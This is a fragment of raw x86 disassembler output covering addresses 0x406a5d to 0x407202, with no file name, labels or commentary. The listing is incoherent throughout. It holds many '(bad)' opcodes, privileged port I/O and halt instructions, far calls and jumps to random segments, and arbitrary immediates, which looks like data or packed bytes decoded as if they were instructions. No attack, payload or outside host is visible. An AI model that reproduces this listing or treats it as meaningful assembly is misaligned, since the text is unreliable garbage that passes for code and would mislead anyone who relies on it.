  406a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a5e:	scas   al,BYTE PTR es:[edi]
  406a5f:	outs   dx,DWORD PTR ds:[esi]
  406a60:	xchg   ebx,eax
  406a61:	mov    dh,0xac
  406a63:	jns    0x4069ed
  406a65:	mov    cl,BYTE PTR [esi]
  406a67:	or     DWORD PTR [ebx-0x44cbd0dc],0xf94902c6
  406a71:	dec    eax
  406a72:	pop    ebp
  406a73:	lds    ecx,FWORD PTR [ebp-0x7390f94f]
  406a79:	shl    BYTE PTR [ecx],1
  406a7b:	and    edi,DWORD PTR [edx]
  406a7d:	not    ecx
  406a7f:	jbe    0x406a12
  406a81:	loop   0x406aa3
  406a83:	aam    0x17
  406a85:	outs   dx,BYTE PTR ds:[esi]
  406a86:	xchg   edx,eax
  406a87:	int3   
  406a88:	jecxz  0x406a1e
  406a8a:	add    ecx,DWORD PTR [esp+edi*1-0x6e109b0f]
  406a91:	jne    0x406ac1
  406a93:	retf   0xf3aa
  406a96:	xchg   edi,eax
  406a97:	cmp    bl,BYTE PTR [esi-0xff0d36c]
  406a9d:	lods   eax,DWORD PTR ds:[esi]
  406a9e:	(bad)  
  406a9f:	jp     0x406a74
  406aa1:	mov    WORD PTR [eax+0x4d420bd],?
  406aa7:	pushf  
  406aa8:	cdq    
  406aa9:	push   esp
  406aaa:	out    0x9,al
  406aac:	adc    eax,0xace98e2d
  406ab1:	push   eax
  406ab2:	adc    bl,BYTE PTR [edi+0x7e893cd7]
  406ab8:	dec    ebp
  406ab9:	jle    0x406b1c
  406abb:	in     eax,0x7f
  406abd:	call   0xd84c:0x53e735d2
  406ac4:	xchg   DWORD PTR [ecx-0x1d],ebx
  406ac7:	or     BYTE PTR [edi-0x55da0cca],bh
  406acd:	call   0x469c:0xcbd6def2
  406ad4:	std    
  406ad5:	pop    ebp
  406ad6:	popa   
  406ad7:	jge    0x406a7d
  406ad9:	imul   edi,eax,0xda703f69
  406adf:	mov    esi,0xaf233c94
  406ae4:	sbb    DWORD PTR [eax+0x7d85d6d],edi
  406aea:	inc    eax
  406aeb:	push   ebx
  406aec:	iret   
  406aed:	fisubr WORD PTR ds:0xe2a5339
  406af3:	mov    ebp,DWORD PTR ds:0xe7a0f675
  406af9:	jmp    0x5cc:0xb74971cf
  406b00:	inc    ebx
  406b01:	scas   al,BYTE PTR es:[edi]
  406b02:	ficom  DWORD PTR [ebx+0x17a5cf7f]
  406b08:	mov    al,ds:0x70278d85
  406b0d:	jno    0x406aa0
  406b0f:	ror    DWORD PTR [esp+edx*8],cl
  406b12:	mov    ch,0x5f
  406b14:	pop    eax
  406b15:	das    
  406b16:	cmp    esp,eax
  406b18:	push   esp
  406b19:	push   eax
  406b1a:	dec    ecx
  406b1b:	std    
  406b1c:	mov    cl,dh
  406b1e:	adc    esp,0xf
  406b21:	mov    ds:0xfa5621e8,al
  406b26:	test   dh,ah
  406b28:	sahf   
  406b29:	jl     0x406ad1
  406b2b:	xchg   edx,eax
  406b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b2d:	add    eax,DWORD PTR [ebp+ecx*1+0x1a]
  406b31:	(bad)  
  406b33:	repnz push es
  406b35:	retf   
  406b36:	cmp    al,0x72
  406b38:	mov    dh,0xd3
  406b3a:	pop    edx
  406b3b:	inc    ebp
  406b3c:	(bad)  
  406b3e:	jge    0x406b07
  406b40:	not    BYTE PTR [eax+0xba8d252]
  406b46:	push   edi
  406b47:	ja     0x406b2d
  406b49:	dec    edi
  406b4a:	ins    DWORD PTR es:[edi],dx
  406b4b:	mov    esi,0x8f6a606b
  406b50:	push   eax
  406b51:	push   esp
  406b52:	(bad)  
  406b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b55:	push   cs
  406b56:	jbe    0x406af6
  406b58:	clc    
  406b59:	mov    bl,0x2f
  406b5b:	cmp    esi,0xffffffbf
  406b5e:	(bad)  
  406b5f:	inc    esp
  406b60:	shl    BYTE PTR [ebp+0x65e3c34d],0x4
  406b67:	inc    ecx
  406b68:	sub    edx,DWORD PTR [edx-0x52]
  406b6b:	call   0x2215:0x83c0073
  406b72:	sbb    esp,DWORD PTR [esi]
  406b74:	sub    DWORD PTR [ebx],ecx
  406b76:	push   ss
  406b77:	xor    al,ah
  406b79:	stos   BYTE PTR es:[edi],al
  406b7a:	ret    
  406b7b:	out    dx,eax
  406b7c:	rol    DWORD PTR [edi+0x53fdb846],1
  406b82:	rol    BYTE PTR [ecx],0x5d
  406b85:	push   ds
  406b86:	lea    edx,[ebp+0x3e]
  406b89:	xlat   BYTE PTR ds:[ebx]
  406b8a:	fs scas al,BYTE PTR es:[edi]
  406b8c:	lods   al,BYTE PTR ds:[esi]
  406b8d:	push   ss
  406b8e:	out    dx,eax
  406b8f:	jge    0x406b8b
  406b91:	inc    esp
  406b92:	aas    
  406b93:	out    dx,eax
  406b94:	call   0x9faa89d6
  406b99:	(bad)  
  406b9a:	push   ss
  406b9b:	pop    ss
  406b9c:	mov    eax,ds:0x18f836e4
  406ba1:	xor    dl,BYTE PTR [ebp+0x66]
  406ba4:	push   cs
  406ba5:	jmp    0x406b3b
  406ba7:	call   0xf488728c
  406bac:	sbb    dl,dl
  406bae:	dec    esi
  406baf:	dec    ebx
  406bb0:	ret    0xa8d2
  406bb3:	popf   
  406bb4:	aaa    
  406bb5:	lods   al,BYTE PTR ds:[esi]
  406bb6:	iret   
  406bb7:	imul   DWORD PTR [edi]
  406bb9:	je     0x406bc0
  406bbb:	jmp    0x406bc9
  406bbd:	in     al,0xa6
  406bbf:	adc    DWORD PTR [edx+0x14],edi
  406bc2:	(bad)  
  406bc3:	dec    ebx
  406bc5:	push   0x1b
  406bc7:	inc    eax
  406bc8:	ret    
  406bc9:	sbb    eax,0x52a475e4
  406bce:	sbb    ecx,DWORD PTR [esi]
  406bd0:	in     al,dx
  406bd1:	add    eax,0xd068dddd
  406bd6:	jns    0x406b73
  406bd8:	(bad)  
  406bd9:	(bad)  
  406bda:	leave  
  406bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bdc:	in     eax,dx
  406bdd:	inc    esp
  406bde:	sbb    al,0x47
  406be0:	add    BYTE PTR [ebp+0x2a],cl
  406be3:	aad    0x84
  406be5:	je     0x406c4d
  406be7:	sti    
  406be8:	jecxz  0x406c5b
  406bea:	push   ss
  406beb:	dec    edi
  406bec:	cwde   
  406bed:	sbb    ch,ch
  406bef:	xchg   ebx,eax
  406bf0:	cli    
  406bf1:	aas    
  406bf2:	pop    ecx
  406bf3:	fdiv   QWORD PTR gs:[ecx]
  406bf6:	dec    ecx
  406bf7:	(bad)  
  406bfa:	lods   al,BYTE PTR ds:[esi]
  406bfb:	sbb    eax,0x71b00f8e
  406c00:	gs add al,0x69
  406c03:	mov    eax,DWORD PTR [edx+esi*2-0x23cfb01e]
  406c0a:	pop    ecx
  406c0b:	mov    ebx,0x33f9d0af
  406c10:	or     ah,bl
  406c12:	push   ds
  406c13:	jle    0x406c85
  406c15:	mov    esp,0x3d30ce36
  406c1a:	fwait
  406c1b:	add    al,0x77
  406c1d:	dec    edx
  406c1e:	mov    edi,0x6e22ac70
  406c23:	popf   
  406c24:	xor    BYTE PTR [ebp+0x5214d576],ah
  406c2a:	or     edx,DWORD PTR [ebx]
  406c2c:	cmp    bh,BYTE PTR [eax+0x240a7f03]
  406c32:	out    0xa4,al
  406c34:	mov    eax,ds:0xb00c6c2b
  406c39:	fcmovnu st,st(6)
  406c3b:	js     0x406c03
  406c3d:	dec    ebx
  406c3e:	imul   ebp,DWORD PTR ds:0x2deb45cb,0xfffffffa
  406c45:	adc    esi,ecx
  406c47:	push   ds
  406c48:	ror    DWORD PTR ds:0x9cf6e7d2,1
  406c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c4f:	xor    dh,BYTE PTR [edi-0xa]
  406c52:	ja     0x406c68
  406c54:	imul   edi,DWORD PTR [esi-0x66],0xffffffcd
  406c58:	mov    ch,0x12
  406c5a:	or     ch,dh
  406c5c:	jnp    0x406be7
  406c5e:	pop    ebp
  406c5f:	inc    eax
  406c60:	xchg   ebp,eax
  406c61:	sar    BYTE PTR [ebx+0x161f2e3f],0x1
  406c68:	into   
  406c69:	pop    ebp
  406c6a:	push   edi
  406c6b:	push   esi
  406c6c:	push   cs
  406c6d:	inc    esi
  406c6e:	xchg   edi,eax
  406c6f:	cmp    BYTE PTR [ebx],0xdd
  406c72:	daa    
  406c73:	das    
  406c74:	rcr    BYTE PTR [esi-0x77],1
  406c77:	leave  
  406c78:	mov    edx,0xa849e680
  406c7d:	js     0x406ccc
  406c7f:	add    eax,DWORD PTR [ebp-0x77]
  406c82:	or     ebx,DWORD PTR [edi+0xc]
  406c85:	mov    cl,0xc6
  406c87:	arpl   ax,bx
  406c89:	adc    ebp,DWORD PTR [edx+0x25]
  406c8c:	adc    eax,0xac682af9
  406c91:	sbb    bh,bl
  406c93:	(bad)  
  406c94:	mov    dh,0x8c
  406c96:	pop    ss
  406c97:	pop    esi
  406c98:	add    bl,BYTE PTR [edx+0x2f96bf0a]
  406c9e:	out    dx,al
  406c9f:	sub    ch,dh
  406ca1:	lock add al,0x34
  406ca4:	(bad)  
  406ca6:	in     eax,0x27
  406ca8:	adc    eax,0x4615304
  406cad:	aam    0x38
  406caf:	mov    dh,0x9d
  406cb1:	arpl   WORD PTR [ecx+eiz*2+0x44],si
  406cb5:	xor    eax,0x3a49abbc
  406cba:	xor    DWORD PTR [edi],ebp
  406cbc:	into   
  406cbd:	scas   al,BYTE PTR es:[edi]
  406cbe:	call   0x309e:0x41959309
  406cc5:	cmp    esi,DWORD PTR [eax+0x25154271]
  406ccb:	cmp    DWORD PTR [edi],0xffffff95
  406cce:	dec    di
  406cd0:	push   ss
  406cd1:	mov    dh,0x2f
  406cd3:	mov    ebx,0x6ae315a8
  406cd8:	repz xlat BYTE PTR ds:[ebx]
  406cda:	xchg   ecx,eax
  406cdb:	(bad)  
  406cdc:	call   0x4d9c7aa2
  406ce1:	test   BYTE PTR ds:0x6bc7d3be,dl
  406ce7:	lahf   
  406ce8:	fldcw  WORD PTR [ecx+0x52]
  406ceb:	aam    0x72
  406ced:	dec    esi
  406cee:	cwde   
  406cef:	xchg   edi,eax
  406cf0:	mov    ebx,0x79faa267
  406cf5:	pop    ds
  406cf6:	mov    ds:0xda0f0f88,al
  406cfb:	fcomip st,st(4)
  406cfd:	adc    DWORD PTR [edi+0x12249dd7],edx
  406d03:	sub    bh,BYTE PTR [ecx]
  406d05:	cdq    
  406d06:	jb     0x406ce2
  406d08:	pusha  
  406d09:	in     eax,0xce
  406d0b:	sbb    DWORD PTR [esi-0x190d1ffa],edx
  406d11:	cmc    
  406d12:	adc    al,0xfa
  406d14:	test   al,0x86
  406d16:	inc    ebp
  406d17:	jp     0x406c9d
  406d19:	dec    ecx
  406d1a:	pusha  
  406d1b:	mov    DWORD PTR [edx+0x76a109ce],edi
  406d21:	pop    ds
  406d22:	inc    esi
  406d23:	and    ecx,DWORD PTR [ebp+edi*8+0x564b5046]
  406d2a:	outs   dx,BYTE PTR ds:[esi]
  406d2b:	inc    ebx
  406d2c:	aas    
  406d2d:	gs dec ebx
  406d2f:	adc    edx,DWORD PTR [esi-0x6db27c9d]
  406d35:	stc    
  406d36:	mov    ch,0x2d
  406d38:	mov    ah,0x12
  406d3a:	mov    WORD PTR [ebp-0x8],cs
  406d3d:	fwait
  406d3e:	pop    ecx
  406d3f:	pop    eax
  406d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d41:	dec    esi
  406d42:	cld    
  406d43:	pop    edx
  406d44:	or     al,0xd9
  406d46:	jmp    0xee6b386f
  406d4b:	cmp    al,0xb4
  406d4d:	push   ebx
  406d4e:	push   cs
  406d4f:	pop    ebx
  406d50:	test   bl,ch
  406d52:	ret    0x5077
  406d55:	mov    DWORD PTR [edx-0x14d45b20],ebx
  406d5b:	mov    si,0xac6f
  406d5f:	cmp    esi,DWORD PTR ds:0xbca0c146
  406d65:	int    0xcb
  406d67:	sbb    al,0xdd
  406d69:	out    dx,eax
  406d6a:	and    eax,0x8db4fe4
  406d6f:	stc    
  406d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d71:	nop
  406d72:	inc    ebx
  406d73:	and    BYTE PTR [esi+0x5dee59d0],bh
  406d79:	pop    es
  406d7a:	shl    DWORD PTR [esi-0x39cf2dfc],1
  406d80:	xchg   ebx,eax
  406d81:	sub    BYTE PTR [edi-0x58],bl
  406d84:	push   esp
  406d85:	(bad)  
  406d86:	aas    
  406d87:	mov    ds:0x20b5fa8,eax
  406d8c:	push   es
  406d8d:	push   ecx
  406d8e:	adc    eax,0x2f1c681b
  406d93:	das    
  406d94:	fsub   QWORD PTR [edi-0x49]
  406d97:	outs   dx,BYTE PTR ds:[esi]
  406d98:	adc    ah,al
  406d9a:	sahf   
  406d9b:	mov    ds:0xd0e205b8,eax
  406da0:	test   BYTE PTR [ebx-0x1e],ch
  406da3:	xchg   edi,eax
  406da4:	(bad)  
  406da5:	mov    bl,0xed
  406da7:	push   esp
  406da9:	gs je  0x406dd6
  406dac:	retf   
  406dad:	inc    edx
  406dae:	push   0x5884c412
  406db3:	sub    al,0x83
  406db5:	sub    eax,0x9236afeb
  406dba:	or     ebp,DWORD PTR [esi-0x537dec8c]
  406dc0:	cdq    
  406dc1:	loop   0x406e04
  406dc3:	inc    ebp
  406dc4:	hlt    
  406dc5:	adc    DWORD PTR [ebp-0x1f5c3f7e],0xf638cd17
  406dcf:	jle    0x406e1f
  406dd1:	aas    
  406dd2:	mov    BYTE PTR [edi-0xe6fa092],bl
  406dd8:	ds jg  0x406da1
  406ddb:	mov    WORD PTR ds:0xed4d2cd5,cs
  406de1:	fcomip st,st(4)
  406de3:	popa   
  406de4:	sbb    ah,ah
  406de6:	mov    bh,0x3d
  406de8:	int3   
  406de9:	mov    al,fs:0x715ed30a
  406def:	jo     0x406de6
  406df1:	outs   dx,DWORD PTR ds:[esi]
  406df2:	aaa    
  406df3:	xchg   ebp,eax
  406df4:	(bad)  
  406df5:	and    edx,DWORD PTR [eax-0x71]
  406df8:	jmp    0x5737:0x487212e0
  406dff:	jne    0x406df3
  406e01:	sar    BYTE PTR [ecx-0x2a9b2dae],cl
  406e07:	fwait
  406e08:	mov    al,0xeb
  406e0a:	sbb    BYTE PTR [ebp+0x1f],ch
  406e0d:	(bad)  
  406e0e:	(bad)  
  406e0f:	loopne 0x406e5f
  406e11:	mov    al,0x7c
  406e13:	das    
  406e14:	arpl   di,ax
  406e16:	sub    DWORD PTR [edx+ebx*1],esp
  406e19:	ins    DWORD PTR es:[edi],dx
  406e1a:	test   BYTE PTR [esi-0x591ef52e],cl
  406e20:	and    eax,0xb4f021b6
  406e25:	or     al,ah
  406e27:	jecxz  0x406e5a
  406e29:	sbb    cl,BYTE PTR [ecx-0x4af6cf3]
  406e2f:	je     0x406db8
  406e31:	cmp    ecx,DWORD PTR ds:0x8323713f
  406e37:	loop   0x406e70
  406e39:	xchg   ebp,eax
  406e3a:	push   ebp
  406e3b:	mov    ah,0x69
  406e3d:	ins    BYTE PTR es:[edi],dx
  406e3e:	add    DWORD PTR [edi-0x67],ebx
  406e41:	pop    edi
  406e42:	stc    
  406e43:	jecxz  0x406e58
  406e45:	dec    esp
  406e46:	int3   
  406e47:	pop    ecx
  406e48:	jmp    0x4dc96b35
  406e4d:	loop   0x406e12
  406e4f:	sbb    BYTE PTR [ebx],0x4e
  406e52:	xchg   ebx,eax
  406e53:	fimul  WORD PTR [eax+edi*4-0x45cbcc7f]
  406e5a:	dec    edi
  406e5b:	mov    ch,0xe6
  406e5d:	or     eax,0x2f13d796
  406e62:	pusha  
  406e63:	xchg   ecx,eax
  406e64:	xchg   edi,eax
  406e65:	add    eax,DWORD PTR [ebx]
  406e67:	js     0x406ee5
  406e69:	push   ecx
  406e6a:	fsub   DWORD PTR [ecx+0x10dab6f1]
  406e70:	sbb    BYTE PTR [ebp-0x54d865d8],0xe
  406e77:	sub    ebx,esi
  406e79:	jge    0x406e59
  406e7b:	ficom  WORD PTR [esi-0x176f4206]
  406e81:	mov    ecx,0xe497c498
  406e86:	pop    ecx
  406e87:	sar    BYTE PTR [esi+0x1e36b134],0xc3
  406e8e:	add    DWORD PTR [edi-0x69],ebp
  406e91:	stc    
  406e92:	push   esp
  406e93:	sbb    al,0x43
  406e95:	(bad)  
  406e96:	ss or  eax,0xacc3e21f
  406e9c:	jecxz  0x406e88
  406e9e:	mov    dl,0x31
  406ea0:	into   
  406ea1:	je     0x406eb7
  406ea3:	in     al,0xdc
  406ea5:	mov    ds:0x1af20357,eax
  406eaa:	mov    eax,0xd1da55f6
  406eaf:	in     al,dx
  406eb0:	xor    al,0x73
  406eb2:	test   BYTE PTR [edi-0x6f],dl
  406eb5:	dec    ebp
  406eb6:	push   es
  406eb7:	call   0xccb2ff44
  406ebc:	int    0xc3
  406ebe:	mul    ebp
  406ec0:	test   DWORD PTR [ecx+0x33],esp
  406ec3:	add    DWORD PTR [edx],0x0
  406ec6:	aaa    
  406ec7:	jae    0x406f07
  406ec9:	nop
  406eca:	push   ebx
  406ecb:	add    eax,0xbf969374
  406ed0:	fistp  WORD PTR [esi+0x555ddfe6]
  406ed6:	ror    BYTE PTR [ecx-0x21],1
  406ed9:	shl    DWORD PTR [ebp+0x69470e7],0xd5
  406ee0:	inc    eax
  406ee1:	mov    WORD PTR [edi+0x6c],ss
  406ee4:	lahf   
  406ee5:	dec    esp
  406ee6:	test   BYTE PTR [edx+0x5049ac32],al
  406eec:	sub    BYTE PTR [ecx-0x6e5ae88e],dh
  406ef2:	aad    0xfd
  406ef4:	push   eax
  406ef5:	or     bh,BYTE PTR [ebx+0x4a]
  406ef8:	mov    esp,0xf4b04aae
  406efd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406efe:	sub    edi,DWORD PTR [edx+0x15]
  406f01:	int3   
  406f02:	adc    eax,0xe0dc026a
  406f07:	sub    DWORD PTR [ebx],esi
  406f09:	dec    edi
  406f0a:	xchg   DWORD PTR [ebx-0x515e6cec],ebp
  406f10:	jo     0x406f71
  406f12:	retf   0xc986
  406f15:	xchg   esi,eax
  406f16:	retf   0xf056
  406f19:	loopne 0x406f08
  406f1b:	xor    al,0x27
  406f1d:	dec    edi
  406f1e:	mov    esi,0x31804015
  406f23:	push   ss
  406f24:	mov    WORD PTR [ecx-0x58],fs
  406f27:	jno    0x406f38
  406f29:	das    
  406f2a:	jmp    0xba3e:0xaccaa02f
  406f31:	imul   dh
  406f33:	leave  
  406f34:	daa    
  406f35:	jnp    0x406f3e
  406f37:	(bad)  
  406f38:	fidivr DWORD PTR [edi-0x2a]
  406f3b:	sbb    al,0xb5
  406f3d:	adc    al,BYTE PTR [esi+edx*8+0x4e583c67]
  406f44:	push   ebp
  406f45:	xlat   BYTE PTR ds:[ebx]
  406f46:	pop    esi
  406f47:	pop    edx
  406f48:	retf   
  406f49:	and    DWORD PTR [eax-0x205fd11a],0x2a6821cf
  406f53:	mov    eax,ds:0x3a60fce9
  406f58:	cld    
  406f59:	aaa    
  406f5a:	scas   eax,DWORD PTR es:[edi]
  406f5b:	(bad)  
  406f5c:	in     al,0x97
  406f5e:	hlt    
  406f5f:	pop    ebp
  406f60:	mov    BYTE PTR [esi-0x78a61656],cl
  406f66:	jmp    0x406f7d
  406f68:	mov    edi,0xce930647
  406f6d:	lahf   
  406f6e:	mov    edi,0xcca03b7f
  406f73:	inc    ebx
  406f74:	into   
  406f75:	jg     0x406f36
  406f77:	jmp    0x406f31
  406f79:	pop    ebp
  406f7a:	and    al,0x9d
  406f7c:	sub    dh,BYTE PTR [edx-0x27]
  406f7f:	adc    ch,bl
  406f81:	dec    esi
  406f82:	aaa    
  406f83:	and    DWORD PTR ss:[edi],edx
  406f86:	rol    DWORD PTR [ecx+0x15361a78],0xcd
  406f8d:	stos   DWORD PTR es:[edi],eax
  406f8e:	add    DWORD PTR [esi+esi*8+0x48],ebp
  406f92:	test   DWORD PTR [eax],esp
  406f94:	cmp    eax,DWORD PTR [ecx+0x30]
  406f97:	mov    edx,0x782f0fa4
  406f9c:	std    
  406f9d:	data16 ins BYTE PTR es:[edi],dx
  406f9f:	jnp    0x406f52
  406fa1:	or     bh,0x92
  406fa4:	xchg   DWORD PTR [ebx+edi*8],ebx
  406fa7:	ss pop es
  406fa9:	sbb    BYTE PTR [ecx+0x60b25ff9],bl
  406faf:	ror    BYTE PTR [ebx],cl
  406fb1:	cmp    eax,0xaaeee46c
  406fb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fb7:	cli    
  406fb8:	xor    edx,DWORD PTR [ebp-0x18cdc8d]
  406fbe:	mov    ebp,0x3530619c
  406fc3:	xor    al,0x9f
  406fc5:	lock in al,0x4d
  406fc8:	dec    esp
  406fc9:	popf   
  406fca:	ja     0x406f8f
  406fcc:	fs aaa 
  406fce:	sub    eax,0x62fd969
  406fd3:	div    DWORD PTR [esi-0x14]
  406fd6:	pop    ecx
  406fd7:	test   bl,ah
  406fd9:	dec    edx
  406fda:	mov    bl,BYTE PTR [ebx-0x329ef97d]
  406fe0:	cld    
  406fe1:	or     BYTE PTR [eax-0x1a],ah
  406fe4:	or     BYTE PTR [edx+0x2a373078],cl
  406fea:	xor    eax,0xb5f5ad5c
  406fef:	mov    esp,0x32766be9
  406ff4:	jns    0x407006
  406ff6:	repz in eax,0xa5
  406ff9:	dec    ebx
  406ffa:	fsubr  QWORD PTR [edi]
  406ffc:	dec    eax
  406ffd:	iret   
  406ffe:	mov    ebp,DWORD PTR [ebx]
  407000:	jns    0x406fe1
  407002:	dec    esp
  407003:	mov    ebx,DWORD PTR [ebx-0x59641804]
  407009:	dec    edi
  40700a:	mov    eax,ds:0xad08116c
  40700f:	fisttp DWORD PTR [esi-0x65]
  407012:	in     eax,dx
  407013:	nop
  407014:	or     edi,DWORD PTR [edx]
  407016:	cmp    ebp,ebx
  407018:	outs   dx,BYTE PTR ds:[esi]
  407019:	dec    ebp
  40701a:	push   eax
  40701b:	pushf  
  40701c:	mov    BYTE PTR [edx+0x3],cl
  40701f:	push   0x63cae2e4
  407024:	push   es
  407025:	les    ecx,FWORD PTR [esi+0x7c8dc965]
  40702b:	arpl   dx,si
  40702d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40702e:	cmp    edx,DWORD PTR [edi]
  407030:	ds out dx,al
  407032:	pop    edi
  407033:	dec    ecx
  407034:	into   
  407035:	lods   eax,DWORD PTR ds:[esi]
  407036:	sbb    cl,BYTE PTR [edx-0x634fe13]
  40703c:	nop
  40703d:	mov    al,ds:0xaf2d3f49
  407042:	pop    ss
  407043:	jmp    0x407058
  407045:	jns    0x407089
  407047:	scas   eax,DWORD PTR es:[edi]
  407048:	hlt    
  407049:	sbb    BYTE PTR [edx-0x5],al
  40704c:	fidivr WORD PTR [ebx+0x7d2eef45]
  407052:	mov    ebp,0x6ea39302
  407057:	(bad)
  40705b:	stos   BYTE PTR es:[edi],al
  40705c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40705d:	mov    dl,0x94
  40705f:	cmp    eax,0x42
  407062:	inc    bp
  407064:	into   
  407065:	fnsave [edi]
  407067:	outs   dx,BYTE PTR ds:[esi]
  407068:	xor    DWORD PTR [eax-0x17297461],0xbf05cf58
  407072:	cmp    edi,DWORD PTR [ebp-0x61]
  407075:	imul   ebp
  407077:	mov    edx,0x543650a2
  40707c:	sar    BYTE PTR [ecx+ebx*4-0x65],1
  407080:	xor    eax,edi
  407082:	fidivr WORD PTR [ecx]
  407084:	das    
  407085:	cs pop eax
  407087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407088:	add    BYTE PTR [edx],dh
  40708a:	push   ebx
  40708b:	fsubp  st(5),st
  40708d:	fsub   QWORD PTR [eax+0x226c271d]
  407093:	call   0x9bad0acb
  407098:	xor    esp,DWORD PTR [eax]
  40709a:	(bad)  
  40709b:	into   
  40709c:	cmp    eax,0x7b46de35
  4070a1:	fs push ebp
  4070a3:	push   es
  4070a4:	add    eax,0xdc61ef20
  4070a9:	inc    eax
  4070aa:	(bad)  
  4070ab:	fild   DWORD PTR [ebx]
  4070ad:	movq   mm0,QWORD PTR [edx+ebp*1-0x11b5af6f]
  4070b5:	or     esp,ebp
  4070b7:	nop
  4070b8:	rcl    bl,cl
  4070ba:	cmp    al,0x85
  4070bc:	lahf   
  4070bd:	imul   ecx,ebx,0xf0d5787c
  4070c3:	fisttp DWORD PTR [ecx-0x5bdca4d0]
  4070c9:	jmp    0xa36b:0xfcb9c00
  4070d0:	shr    BYTE PTR [eax+0x2c],0x78
  4070d4:	icebp  
  4070d5:	xchg   edx,eax
  4070d6:	ret    
  4070d7:	out    0xdb,eax
  4070d9:	jg     0x407120
  4070db:	jno    0x407131
  4070dd:	dec    ebx
  4070de:	and    ch,BYTE PTR [ebx-0x24]
  4070e1:	add    BYTE PTR [ecx],ch
  4070e3:	frstor [eax]
  4070e5:	mov    dl,0xf3
  4070e7:	pop    esi
  4070e8:	fild   DWORD PTR [ecx-0x15]
  4070eb:	mov    ecx,0xdcf5e098
  4070f0:	cmp    edx,esp
  4070f2:	pusha  
  4070f3:	(bad)  
  4070f4:	cld    
  4070f5:	daa    
  4070f6:	cmp    al,ah
  4070f8:	sahf   
  4070f9:	or     BYTE PTR [edx],bl
  4070fb:	inc    ebx
  4070fc:	mov    edi,0xde71d146
  407101:	add    BYTE PTR [ecx-0x74f0fc89],dh
  407107:	aas    
  407108:	shl    DWORD PTR [ebx],0x65
  40710b:	cmc    
  40710c:	pop    eax
  40710d:	sbb    dl,BYTE PTR [ebx-0x62]
  407110:	cli    
  407111:	xchg   edi,eax
  407112:	stos   BYTE PTR es:[edi],al
  407113:	jne    0x407140
  407115:	in     al,0xb
  407117:	fwait
  407118:	aam    0x66
  40711a:	and    ebx,DWORD PTR [ebp-0x606cc129]
  407120:	jbe    0x407171
  407122:	pop    edx
  407123:	cmp    edx,ebp
  407125:	or     al,0xc3
  407127:	push   ds
  407128:	push   cs
  407129:	xchg   BYTE PTR [eax-0x48f7393b],cl
  40712f:	in     eax,0xdf
  407131:	mov    eax,0x27bd32d7
  407136:	adc    ah,bh
  407138:	pop    edi
  407139:	jns    0x4070e4
  40713b:	sbb    ecx,DWORD PTR [ebp+0x60]
  40713e:	jo     0x40715e
  407140:	sti    
  407141:	in     al,dx
  407142:	shl    BYTE PTR [edi],0xdb
  407145:	in     al,0xf
  407147:	mov    bl,0x7f
  407149:	pop    ss
  40714a:	ja     0x407162
  40714c:	(bad)  
  40714d:	fxch   st(7)
  40714f:	std    
  407150:	in     eax,dx
  407151:	xchg   esi,eax
  407152:	sbb    bh,0x6b
  407155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407156:	retf   0x386a
  407159:	daa    
  40715a:	nop
  40715b:	sbb    al,0xfb
  40715d:	lods   al,BYTE PTR ds:[esi]
  40715e:	int    0x74
  407160:	fsubr  QWORD PTR [edi+0x3c]
  407163:	outs   dx,DWORD PTR ds:[esi]
  407164:	xor    ah,bl
  407166:	and    eax,0x190fae0
  40716b:	lods   eax,DWORD PTR ds:[esi]
  40716c:	xchg   esp,eax
  40716d:	inc    ecx
  40716e:	pop    esp
  40716f:	pop    eax
  407170:	and    bl,BYTE PTR [ebx+0xe5b7cd8]
  407176:	or     eax,0xcf145c4a
  40717b:	xchg   ecx,eax
  40717c:	xor    DWORD PTR [ebx],esp
  40717e:	and    DWORD PTR [esi+0x6c],eax
  407181:	xchg   BYTE PTR [esi+0x17],dh
  407184:	pop    ds
  407185:	in     eax,dx
  407186:	push   ecx
  407187:	test   BYTE PTR [eax-0x77dc5a07],dl
  40718d:	push   esi
  40718e:	fistp  DWORD PTR [ebp+0x2075dde8]
  407194:	das    
  407195:	mov    ds:0xee57bfd0,al
  40719a:	pop    esi
  40719b:	jg     0x40715f
  40719d:	les    dx,DWORD PTR [ecx+0x77ab8e3f]
  4071a4:	fnstcw WORD PTR [esi]
  4071a6:	iret   
  4071a7:	loopne 0x407195
  4071a9:	mov    WORD PTR [edx],ss
  4071ab:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4071ad:	dec    edx
  4071ae:	mov    edi,0xdbd059f8
  4071b3:	mov    bh,BYTE PTR [eax-0x608f1658]
  4071b9:	jno    0x40720e
  4071bb:	(bad)  
  4071bc:	dec    ebp
  4071bd:	jae    0x407154
  4071bf:	cmp    DWORD PTR [ebp+0x5e],esi
  4071c2:	in     eax,dx
  4071c3:	pop    edx
  4071c4:	nop    DWORD PTR [edi]
  4071c7:	inc    ebx
  4071c8:	inc    edx
  4071c9:	imul   edi,edi,0x3a8bf374
  4071cf:	sbb    esi,DWORD PTR [esi+0x60]
  4071d2:	adc    bl,BYTE PTR [ebp+0x73c91b97]
  4071d8:	dec    eax
  4071d9:	mov    al,0x94
  4071db:	popa   
  4071dc:	adc    BYTE PTR ds:0xfe118f89,cl
  4071e2:	ja     0x4071f0
  4071e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071e5:	mov    esi,0x407daa33
  4071ea:	hlt    
  4071eb:	cmc    
  4071ec:	fs std 
  4071ee:	jb     0x4071b2
  4071f0:	jmp    0x407265
  4071f2:	stos   BYTE PTR es:[edi],al
  4071f3:	sahf   
  4071f4:	(bad)  
  4071f5:	or     al,0x80
  4071f7:	xor    ah,ah
  4071f9:	inc    edx
  4071fa:	cmp    DWORD PTR [ebx+0x5d80bdf2],ecx
  407200:	inc    ecx
  407201:	aas    
  407202:	popf   
